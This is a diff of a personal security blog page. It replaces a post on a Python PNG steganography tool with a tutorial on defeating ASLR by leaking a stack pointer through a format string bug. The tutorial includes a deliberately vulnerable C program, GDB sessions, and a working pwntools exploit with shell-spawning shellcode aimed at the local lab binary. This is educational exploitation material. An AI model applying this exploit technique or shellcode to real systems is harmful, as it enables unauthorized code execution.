@@ -11,7 +11,7 @@
 
   <title>
     
-      Basic PNG Image Steganography Tool Built Using Python &middot; Nihaal Prasad
+      Defeating ASLR via Memory Leak &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">Basic PNG Image Steganography Tool Built Using Python</h1>
+  <h1 class="page-heading">Defeating ASLR via Memory Leak</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,191 +193,246 @@
 
   <hr>
   <div class="post-body">
-    <p>So today, I’m going to show you how I built a simple PNG steganography tool using <a href="https://python-pillow.org/">Pillow</a> and <a href="https://pypi.org/project/bitarray/">Bitarray</a> in Python 3. Here’s an example of how you could encode the message “This will be encoded” into a file called “picture.png”:</p>
+    <p>Address Space Layout Randomization (ASLR) is a modern exploit mitigation technique that Operating Systems typically use to randomize addresses when a process is executed. This is implemented by having the OS change the locations of special areas, such as the base of executable, the heap, the stack, and any libraries that are loaded in memory. Since memory addresses are unpredictable when ASLR is turned on, hardcoded addresses can no longer be used in exploits when ASLR is enabled.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Python 3.6.6 (default, Sep 12 2018, 18:26:19) 
-[GCC 8.0.1 20180414 (experimental) [trunk revision 259383]] on linux
-Type "help", "copyright", "credits" or "license" for more information.
-&gt;&gt;&gt; import py_hider # The name of my steganography tool
-&gt;&gt;&gt; encoded_img = py_hider.encodePNG('This will be encoded.', 'picture.png') # To encode something in PNG file
-&gt;&gt;&gt; encoded_img.save('encoded.png') # Save the file with the encoded message
-&gt;&gt;&gt; py_hider.decodePNG('encoded.png') # Decode a PNG file with a message embedded into it
-'This will be encoded.'
+<p>Sometimes, if there is a poor implementation of ASLR, the addresses may not be very random (ex. only a byte or two actually change when the program is executed). In other cases, one might try to exploit a partial overwrite, which means that there are only a few unknown bytes of the address. In both of these cases, it may be possible to brute force all the possible addresses in our exploit. However, brute forcing is infeasible if the address space is properly randomized, so this blog post is going to be focused on using a more reliable method of bypassing ASLR: leaking memory addresses.</p>
+
+<p>One thing to note about ASLR is that it does not change offsets. That is, if during one instance of a process, there was a variable that was located at <code class="highlighter-rouge">0x00001000</code> and a second variable that was located at <code class="highlighter-rouge">0x00001010</code> in the same library, then the second variable will always be <code class="highlighter-rouge">0x10</code> bytes away from the first variable no matter what. If ASLR changes the first variable’s location to <code class="highlighter-rouge">0x00001234</code> while executing the program again, then the second variable must be at <code class="highlighter-rouge">0x00001244</code> because it must remain <code class="highlighter-rouge">0x10</code> bytes away from the first variable.</p>
+
+<p>Because offsets remain the same, if an attacker can leak just one address from the program, the attacker will be able to use that one address to calculate any other addresses in the same memory mapping by adding or subtracting some constant offset. An attacker could then write an exploit that leaks an address off of the stack (using something like a format string vulnerability), use the leaked address to figure out the address of some shellcode, and exploit a buffer overflow to overwrite the return address with the calculated address of the shellcode. Since the offset does not change, this exploit should work in all instances.</p>
+
+<p>This is the C program that will be exploited:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="c1">// Compilation: gcc -o buffers -fno-stack-protector -z execstack buffers.c</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+    <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter your input for the first buffer (fmt str vuln): "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">buf1</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Enter your input for the second buffer (stack overflow): "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="mi">300</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 
-<p>Both the regular image and the image with the encoded information look almost exactly the same. You can find all of the code <a href="https://github.com/nihaal-prasad/PyHider">here</a>.</p>
-
-<p>First of all, before I talk about how I coded this program, I need to explain how LSB image steganography works. Most digital images store everything in pixels, and each pixel is made up of red, green, and blue values (aka RGB values). Image steganography, as you probably already know, allows someone to hide a message inside an image so that anyone who sees the image has no clue that there is a hidden message there. I had used the least significant bits to encode my message when I created this program, which exploits the fact that humans cannot see the difference if you change the RGB values of a pixel by a 1 (ex. if you change a pixel RGB values from [123, 11, 57] to [124, 12, 58], humans will not notice a difference).</p>
-
-<p>Using this technique, a programmer can therefore state that an even number in an RGB value could represent a 0 and an odd number in an RGB could represent a 1. By changing the RGB values accordingly (usually by adding one) so that their divisibility by two correspond to ones and zeros, someone could implement an ascii or utf-8 message into an image without anybody else realizing that there is a message encoded into the image. For more information on how exactly this works, click <a href="https://en.wikipedia.org/wiki/Bit_numbering#Least_significant_bit_in_digital_steganography">here</a>.</p>
-
-<p>Now onto how I programmed this. The first thing I did is download <a href="https://python-pillow.org/">Pillow</a> and <a href="https://pypi.org/project/bitarray/">Bitarray</a> using the “pip3 install &lt;package&gt;” command. Next, I opened up Python and imported everything that I was going to be using. I also initialized a function called encodePNG(), which would obviously be used in order to encode the message.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import sys
-import bitarray
-from PIL import Image
-
-def encodePNG(plaintext: str, imgFile: str, encoding='utf-8') -&gt; Image:
+<p>Assume that NX and stack canaries are disabled. The <code class="highlighter-rouge">printf(buf1)</code> call is clearly vulnerable to a format string exploit since the user controls what’s in <code class="highlighter-rouge">buf1</code>. The <code class="highlighter-rouge">fgets(buf2, 300, stdin)</code> is vulnerable to a stack buffer overflow because it is trying to read 300 bytes of data into a 100 byte buffer. After doing some poking around, one can see that the return address is located 232 bytes into the second buffer.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -c "print('A\n'+'A'*232+'BBBBBBBB')" &gt; test                                                    130 ⨯
+$ ./buffers &lt; test
+Enter your input for the first buffer (fmt str vuln): A
+zsh: segmentation fault  ./buffers &lt; test
 </code></pre></div></div>
 
-<p>The first thing that I needed to do inside the function was to open the image using Pillow so that I could access it.</p>
+<p>As proof, here is what this looks like in GDB. Note that the return address on the stack has been overwritten with B’s after 232 bytes have been written to the second buffer.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gdb buffers                                                                                            139 ⨯
+GNU gdb (Debian 10.1-1.4) 10.1
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    # Open the image
-    img = Image.open(imgFile).convert('RGB')
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+GEF for linux ready, type `gef' to start, `gef config' to configure
+76 commands loaded for GDB 10.1 using Python engine 3.9
+[*] 4 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from buffers...
+(No debugging symbols found in buffers)
+gef➤  r &lt; test
+Starting program: /home/nihaal/Desktop/buffers &lt; test
+Enter your input for the first buffer (fmt str vuln): A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555555552bb in main ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0
+$rbx   : 0x0
+$rcx   : 0x00005555555597a3  →  0x0000000000000000
+$rdx   : 0x0
+$rsp   : 0x00007fffffffe028  →  "BBBBBBBB\n"
+$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
+$rsi   : 0x00005555555596b2  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
+$rip   : 0x00005555555552bb  →  &lt;main+374&gt; ret
+$r8    : 0x00007fffffffdf40  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$r9    : 0x0
+$r10   : 0x0000555555556040  →  "Enter your input for the second buffer (stack over[...]"
+$r11   : 0x246
+$r12   : 0x0000555555555060  →  &lt;_start+0&gt; xor ebp, ebp
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe028│+0x0000: "BBBBBBBB\n"         ← $rsp
+0x00007fffffffe030│+0x0008: 0x00007fffffff000a  →  0x0000000000000000
+0x00007fffffffe038│+0x0010: 0x0000000100000000
+0x00007fffffffe040│+0x0018: 0x0000555555555145  →  &lt;main+0&gt; push rbp
+0x00007fffffffe048│+0x0020: 0x00007ffff7e157cf  →  &lt;init_cacheinfo+287&gt; mov rbp, rax
+0x00007fffffffe050│+0x0028: 0x0000000000000000
+0x00007fffffffe058│+0x0030: 0x852cdd6ab588b454
+0x00007fffffffe060│+0x0038: 0x0000555555555060  →  &lt;_start+0&gt; xor ebp, ebp
+──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x5555555552b0 &lt;main+363&gt;       call   0x555555555040 &lt;fgets@plt&gt;
+   0x5555555552b5 &lt;main+368&gt;       mov    eax, 0x0
+   0x5555555552ba &lt;main+373&gt;       leave
+ → 0x5555555552bb &lt;main+374&gt;       ret
+[!] Cannot disassemble from $PC
+──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "buffers", stopped 0x5555555552bb in main (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x5555555552bb → main()
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  info frame
+Stack level 0, frame at 0x7fffffffe028:
+ rip = 0x5555555552bb in main; saved rip = 0x4242424242424242
+ Arglist at 0x4141414141414141, args:
+ Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe030
+ Saved registers:
+  rip at 0x7fffffffe028
 </code></pre></div></div>
 
-<p>Next, I took the plaintext, which is a parameter that is currently in string format, and converted it into a bitarray so that I could access it in 1’s and 0’s.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    # Convert the plaintext into a bitarray
-    message = bitarray.bitarray()
-    message.frombytes(plaintext.encode(encoding)) 
+<p>This is what the <code class="highlighter-rouge">main()</code> function looks like:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  disas main
+Dump of assembler code for function main:
+   0x0000555555555145 &lt;+0&gt;:     push   rbp
+   0x0000555555555146 &lt;+1&gt;:     mov    rbp,rsp
+   0x0000555555555149 &lt;+4&gt;:     sub    rsp,0xf0
+   0x0000555555555150 &lt;+11&gt;:    mov    DWORD PTR [rbp-0xe4],edi
+   0x0000555555555156 &lt;+17&gt;:    mov    QWORD PTR [rbp-0xf0],rsi
+   0x000055555555515d &lt;+24&gt;:    mov    QWORD PTR [rbp-0x70],0x0
+   0x0000555555555165 &lt;+32&gt;:    mov    QWORD PTR [rbp-0x68],0x0
+   0x000055555555516d &lt;+40&gt;:    mov    QWORD PTR [rbp-0x60],0x0
+   0x0000555555555175 &lt;+48&gt;:    mov    QWORD PTR [rbp-0x58],0x0
+   0x000055555555517d &lt;+56&gt;:    mov    QWORD PTR [rbp-0x50],0x0
+   0x0000555555555185 &lt;+64&gt;:    mov    QWORD PTR [rbp-0x48],0x0
+   0x000055555555518d &lt;+72&gt;:    mov    QWORD PTR [rbp-0x40],0x0
+   0x0000555555555195 &lt;+80&gt;:    mov    QWORD PTR [rbp-0x38],0x0
+   0x000055555555519d &lt;+88&gt;:    mov    QWORD PTR [rbp-0x30],0x0
+   0x00005555555551a5 &lt;+96&gt;:    mov    QWORD PTR [rbp-0x28],0x0
+   0x00005555555551ad &lt;+104&gt;:   mov    QWORD PTR [rbp-0x20],0x0
+   0x00005555555551b5 &lt;+112&gt;:   mov    QWORD PTR [rbp-0x18],0x0
+   0x00005555555551bd &lt;+120&gt;:   mov    DWORD PTR [rbp-0x10],0x0
+   0x00005555555551c4 &lt;+127&gt;:   mov    QWORD PTR [rbp-0xe0],0x0
+   0x00005555555551cf &lt;+138&gt;:   mov    QWORD PTR [rbp-0xd8],0x0
+   0x00005555555551da &lt;+149&gt;:   mov    QWORD PTR [rbp-0xd0],0x0
+   0x00005555555551e5 &lt;+160&gt;:   mov    QWORD PTR [rbp-0xc8],0x0
+   0x00005555555551f0 &lt;+171&gt;:   mov    QWORD PTR [rbp-0xc0],0x0
+   0x00005555555551fb &lt;+182&gt;:   mov    QWORD PTR [rbp-0xb8],0x0
+   0x0000555555555206 &lt;+193&gt;:   mov    QWORD PTR [rbp-0xb0],0x0
+   0x0000555555555211 &lt;+204&gt;:   mov    QWORD PTR [rbp-0xa8],0x0
+   0x000055555555521c &lt;+215&gt;:   mov    QWORD PTR [rbp-0xa0],0x0
+   0x0000555555555227 &lt;+226&gt;:   mov    QWORD PTR [rbp-0x98],0x0
+   0x0000555555555232 &lt;+237&gt;:   mov    QWORD PTR [rbp-0x90],0x0
+   0x000055555555523d &lt;+248&gt;:   mov    QWORD PTR [rbp-0x88],0x0
+   0x0000555555555248 &lt;+259&gt;:   mov    DWORD PTR [rbp-0x80],0x0
+   0x000055555555524f &lt;+266&gt;:   lea    rdi,[rip+0xdb2]        # 0x555555556008
+   0x0000555555555256 &lt;+273&gt;:   mov    eax,0x0
+   0x000055555555525b &lt;+278&gt;:   call   0x555555555030 &lt;printf@plt&gt;
+   0x0000555555555260 &lt;+283&gt;:   mov    rdx,QWORD PTR [rip+0x2dd9]        # 0x555555558040 &lt;stdin@@GLIBC_2.2.5&gt;
+   0x0000555555555267 &lt;+290&gt;:   lea    rax,[rbp-0x70]
+   0x000055555555526b &lt;+294&gt;:   mov    esi,0x64
+   0x0000555555555270 &lt;+299&gt;:   mov    rdi,rax
+   0x0000555555555273 &lt;+302&gt;:   call   0x555555555040 &lt;fgets@plt&gt;
+   0x0000555555555278 &lt;+307&gt;:   lea    rax,[rbp-0x70]
+   0x000055555555527c &lt;+311&gt;:   mov    rdi,rax
+   0x000055555555527f &lt;+314&gt;:   mov    eax,0x0
+   0x0000555555555284 &lt;+319&gt;:   call   0x555555555030 &lt;printf@plt&gt;
+   0x0000555555555289 &lt;+324&gt;:   lea    rdi,[rip+0xdb0]        # 0x555555556040
+   0x0000555555555290 &lt;+331&gt;:   mov    eax,0x0
+   0x0000555555555295 &lt;+336&gt;:   call   0x555555555030 &lt;printf@plt&gt;
+   0x000055555555529a &lt;+341&gt;:   mov    rdx,QWORD PTR [rip+0x2d9f]        # 0x555555558040 &lt;stdin@@GLIBC_2.2.5&gt;
+   0x00005555555552a1 &lt;+348&gt;:   lea    rax,[rbp-0xe0]
+   0x00005555555552a8 &lt;+355&gt;:   mov    esi,0x12c
+   0x00005555555552ad &lt;+360&gt;:   mov    rdi,rax
+   0x00005555555552b0 &lt;+363&gt;:   call   0x555555555040 &lt;fgets@plt&gt;
+   0x00005555555552b5 &lt;+368&gt;:   mov    eax,0x0
+   0x00005555555552ba &lt;+373&gt;:   leave
+=&gt; 0x00005555555552bb &lt;+374&gt;:   ret
 </code></pre></div></div>
 
-<p>Then I obtained the width and height of the image in pixels, which will be required to create our two for loops.</p>
+<p>Before writing the exploit, an attaker needs to look at the memory addresses that can be leaked off of the stack from the format string vulnerability and discover their offsets from the address that contains the shellcode. In this example, one can set a breakpoint at *main+368 (right after the second call to <code class="highlighter-rouge">fgets()</code>), exploit the format string vulnerability to print out addresses off of the stack, and look at the addresses. The goal here is to find the start of the second buffer and a suitable address leaked off of the stack. Subtracting these two addresses will result in obtaining the offset that is required for the exploit.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    # Get the width and height of the image in pixels
-    width, height = img.size
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  b *main+368
+Breakpoint 2 at 0x12b5
+gef➤  r
+Starting program: /home/nihaal/Desktop/buffers
+Enter your input for the first buffer (fmt str vuln): %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+0x5555555596b1.(nil).0x5555555596cf.0x7fffffffdfb0.0x7ffff7fadbe0.0x7fffffffe118.0x100000000.(nil).(nil).(nil).
+Enter your input for the second buffer (stack overflow): AAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 2, 0x00005555555552b5 in main ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x00007fffffffdf40  →  "AAAAAAAAAAAAAAAAAAAAAA\n"
+$rbx   : 0x0
+$rcx   : 0x00005555555596c7  →  ".%p.%p.\n"
+$rdx   : 0x0
+$rsp   : 0x00007fffffffdf30  →  0x00007fffffffe118  →  0x00007fffffffe42f  →  "/home/nihaal/Desktop/buffers"
+$rbp   : 0x00007fffffffe020  →  0x00005555555552c0  →  &lt;__libc_csu_init+0&gt; push r15
+$rsi   : 0x00005555555596b1  →  "AAAAAAAAAAAAAAAAAAAAA\n.%p.%p.\n"
+$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
+$rip   : 0x00005555555552b5  →  &lt;main+368&gt; mov eax, 0x0
+$r8    : 0x00007fffffffdf40  →  "AAAAAAAAAAAAAAAAAAAAAA\n"
+$r9    : 0x0
+$r10   : 0x0000555555556040  →  "Enter your input for the second buffer (stack over[...]"
+$r11   : 0x246
+$r12   : 0x0000555555555060  →  &lt;_start+0&gt; xor ebp, ebp
+$r13   : 0x0
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 </code></pre></div></div>
 
-<p>I created a list to keep track of the RGB data for the new image (Pillow has a function that can put the data in the RGB list into the image). A counter variable will also be used in order to keep track of how much of the message we have written.</p>
+<p>As one can see above, the fourth value printed out from the stack when exploiting the format string vulnerability is <code class="highlighter-rouge">0x7fffffffdfb0</code> in this instance of the process. The second buffer, which is currently in <code class="highlighter-rouge">rax</code>, starts at <code class="highlighter-rouge">0x00007fffffffdf40</code> in the same instance. This means that the fourth value printed out from the format string vulnerability is always going to have an offset of <code class="highlighter-rouge">0x7fffffffdfb0 - 0x00007fffffffdf40 = 112</code> bytes. In other words, subtracting 112 bytes from the fourth pointer on the stack will result in the address of the second buffer, which is where the shellcode will be injected.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    # Counter for the message
-    counter = 0
+<p>Now that the offset is known, it is simple to write a program that exploits the buffer overflow using this calculated address. The only difference between this buffer overflow and a buffer overflow with ASLR turned off is that this buffer overflow does not use a hardcoded address. Instead, this exploit will calculate the address of the shellcode on the spot using the information that was leaked earlier.</p>
 
-    # RGB data for the new image
-    new_img_data = []
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Open up the process
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./buffers"</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span> <span class="c1"># Ignore the first part
+</span>
+<span class="c1"># Leak the fourth pointer from the stack
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"</span><span class="si">%4%</span><span class="s">p"</span><span class="p">)</span> <span class="c1"># This will directly print out the fourth pointer
+</span>
+<span class="c1"># Calculate the address of the buffer that will contain the shellcode
+# It should be 112 bytes away from the leaked address
+</span><span class="n">addr</span> <span class="o">=</span>  <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">112</span><span class="p">)</span>
+
+<span class="c1"># Generate the shellcode
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x48\x81\xec\x2c\x01\x00\x00\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05</span><span class="s">"</span>
+<span class="n">nops</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">232</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">nops</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">addr</span>
+
+<span class="c1"># Trigger the buffer overflow
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>I start two for loops in order to loop through every single pixel in the image. I also use the current x and y values to get our current RGB values, and store that information in the r, g, and b variables.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    # Loop through each pixel
-    for y in range(0, height):
-        for x in range(0, width):
-            # Get the red, green, and blue values for the pixel
-            r, g, b = img.getpixel((x, y))
-</code></pre></div></div>
-
-<p>I then use the least significant bit in the red value to write my message. Recall that an even number represents a zero and an odd number represents a one. I can easily change whether a number is even or odd by adding one to it. This is done in code by first doing r mod 2, which returns the least significant digit, and then adding one to r if it is not the value that I wanted it to be. I also add an else if statement to make sure that if we finish writing the message, then we can put down zeros in the least significant digit to indicate the end of message.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            # Continue writing our message in the red value if we have not yet finished
-            if(counter &lt; len(message)):
-                if(not message[counter]):
-                    if(r % 2 != 0): r = r + 1
-                elif(message[counter]):
-                    if(r % 2 != 1): r = r + 1
-                counter = counter + 1
-            elif(counter &gt;= len(message)): # If we have finished our message, put down zeros to indicate the end of message
-                if(r % 2 != 0): r = r + 1
-                counter = counter + 1
-</code></pre></div></div>
-
-<p>I use the exact same code for the blue and green values.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            # Continue writing our message in the green value if we have not yet finished
-            if(counter &lt; len(message)):
-                if(not message[counter]):
-                    if(g % 2 != 0): g = g + 1
-                elif(message[counter]):
-                    if(g % 2 != 1): g = g + 1
-                counter = counter + 1
-            elif(counter &gt;= len(message)): # If we have finished our message, put down zeros to indicate the end of message
-                if(g % 2 != 0): g = g + 1
-                counter = counter + 1
-
-            # Continue writing our message in the blue value if we have not yet finished
-            if(counter &lt; len(message)):
-                if(not message[counter]):
-                    if(b % 2 != 0): b = b + 1
-                elif(message[counter]):
-                    if(b % 2 != 1): b = b + 1
-                counter = counter + 1
-            elif(counter &gt;= len(message)): # If we have finished our message, put down zeros to indicate the end of message
-                if(b % 2 != 0): b = b + 1
-                counter = counter + 1
-</code></pre></div></div>
-
-<p>At the end of the nested for loop, I appended the new RGB values to the list that I initialized earlier.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            # Write down the RGB values in the new image
-            new_img_data.append((r, g, b))
-</code></pre></div></div>
-
-<p>At the end of the function, I returned the new image.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    # Return the new image
-    new_img = Image.new(img.mode, img.size)
-    new_img.putdata(new_img_data)
-    return new_img
-</code></pre></div></div>
-
-<p>I’ve finished the encodePNG() function. Now lets start working on the decodePNG() function. Like our previous function, I start by opening the image. Then I create a counter to identify a NULL character (seven 0’s), which will be used to represent the end of the string. I also create a list of bits to represent the encoded message (the bitarray module has a function that can turn a list of bits into a string). I also need the width and height of the image to create the nested for loop.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def decodePNG(imgFile: str) -&gt; str:
-    # Open the image
-    img = Image.open(imgFile).convert('RGB')
-
-    # This counter is used to identify a NULL character (seven 0's), which will be used to represent the end of the string
-    counter = 0
-
-    # These are the bits that make up the message
-    bits = []
-
-    # Get the width and height in pixels
-    width, height = img.size
-</code></pre></div></div>
-
-<p>The first part of the nested for loop is simple. Just find each RGB value, find the remainder after dividing by 2 to figure out whether it’s even or odd, and then append that value to the list of bits.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    # Read each pixel
-    for y in range(0, height):
-        for x in range(0, width):
-            # Get the red, green, and blue values for the pixel
-            r, g, b = img.getpixel((x, y))
-
-            # Add r to the bits list
-            bits.append(r % 2)
-            bits.append(g % 2)
-            bits.append(b % 2) 
-</code></pre></div></div>
-
-<p>The next part involves checking whether there have been seven consecutive zeros and breaking the for loops if there has been seven consecutive zeros.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            # Change the counter for the r value
-            if(r % 2 == 0): counter = counter + 1
-            else: counter = 0
-
-            # Change the counter for the g value
-            if(g % 2 == 0): counter = counter + 1
-            else: counter = 0
-
-            # Change the counter for the b value
-            if(b % 2 == 0): counter = counter + 1
-            else: counter = 0
-
-            # Check if seven zeros have been found (our terminating value) and break the inner loop if it has
-            if(counter &gt;= 7): break
-        # Check if seven zeros have been found (our terminating value) and break the outer loop if it has
-        if(counter &gt;= 7): break
-</code></pre></div></div>
-
-<p>Finally, we are done with this function. All we have to do now is to convert the list of bits to a string and output this string.</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    # Convert the message to string format and return it
-    output = bitarray.bitarray(bits).tostring()
-    return output[:len(output) - 1] # Slices the last character because the last character is always a null character (\x00)
-</code></pre></div></div>
-
-<p>And there you go. That’s how I made a simple PNG steganography tool that works great. If you want to see all of the code, click <a href="https://github.com/nihaal-prasad/PyHider/blob/master/py_hider.py">here</a>.</p>
+<p>This exploit should work even when ASLR is turned on.</p>
 
 <section class="related">
   <h3 style="color: black">Related Posts</h3>
   <ul class="post-list">
-    
-      <li style="color: black; font-size: 9;">
-        <a href="/2020/12/29/defeating-aslr-via-memory-leak.html">
-          Defeating ASLR via Memory Leak
-        </a>
-      </li>
     
       <li style="color: black; font-size: 9;">
         <a href="/2020/10/25/mining-hero-vulnerabilities.html">
@@ -388,6 +443,12 @@ def encodePNG(plaintext: str, imgFile: str, encoding='utf-8') -&gt; Image:
       <li style="color: black; font-size: 9;">
         <a href="/2020/10/21/simple-heap-buffer-overflow.html">
           Simple Heap Buffer Overflow
+        </a>
+      </li>
+    
+      <li style="color: black; font-size: 9;">
+        <a href="/2020/10/14/return-oriented-programming-tutorial.html">
+          Return Oriented Programming Tutorial
         </a>
       </li>
     
